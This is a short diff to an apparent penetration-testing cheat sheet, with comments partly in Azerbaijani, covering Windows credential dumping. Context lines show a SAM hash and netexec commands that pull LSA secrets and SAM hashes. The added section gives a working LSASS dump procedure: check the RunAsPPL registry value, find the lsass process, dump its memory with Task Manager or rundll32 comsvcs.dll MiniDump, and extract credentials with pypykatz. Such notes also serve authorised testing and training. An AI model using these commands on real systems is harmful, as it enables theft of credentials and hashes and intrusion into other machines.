@@ -24,3 +24,19 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
 
 netexec smb <IP> --local-auth -u <USER> -p <PASS> --lsa
 netexec smb <IP> --local-auth -u <USER> -p <PASS> --sam
+
+LSASS Dump Technique:
+HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+RunAsPPL = 1 olarsa mümkün deyil.
+RunAsPPL = 0 olarsa davam et
+
+1) Task Manager --> Local Security Authority Process --> Create dump file ( %temp% )
+
+CMD: tasklist /svc
+PowerShell: Get-Process lsass
+
+2) rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
+3) pypykatz lsa minidump /home/peter/Documents/lsass.dmp
+
+
+
